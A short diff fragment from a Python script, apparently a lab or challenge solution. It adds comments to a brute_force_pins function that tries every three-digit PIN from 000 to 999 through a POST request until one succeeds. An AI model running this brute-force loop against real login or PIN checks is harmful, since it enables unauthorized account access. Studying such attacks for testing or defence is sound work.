@@ -50,7 +50,9 @@ def send_post_request(pin):
         return False
     
 def brute_force_pins():
+    # Try all possible 3-digit PINs from 000 to 999
     for pin in range(1000):
+        # Send the PIN using a POST request
         if send_post_request(pin):
             print(f"Found correct PIN: {pin:03d}")
             break
